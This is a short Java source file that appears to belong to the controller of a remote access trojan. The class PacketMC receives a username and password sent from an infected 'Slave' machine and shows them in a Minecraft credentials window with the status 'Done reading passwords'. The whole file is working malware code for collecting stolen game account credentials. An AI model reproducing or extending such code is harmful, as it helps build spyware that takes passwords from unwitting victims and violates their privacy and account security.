package com.redpois0n.packets;

import com.redpois0n.Slave;
import com.redpois0n.ui.frames.FrameMinecraft;

public class PacketMC extends AbstractPacket {

	@Override
	public void read(Slave slave, String line) throws Exception {
		String first = slave.readLine();
		String second = slave.readLine();

		FrameMinecraft frame = FrameMinecraft.instances.get(slave);

		if (frame != null) {
			if (first.equals("ERR")) {
				frame.setStatus(second, true);
			} else {
				frame.setUserPass(first, second);
				frame.setStatus("Done reading passwords", false);
			}
		}
	}

}
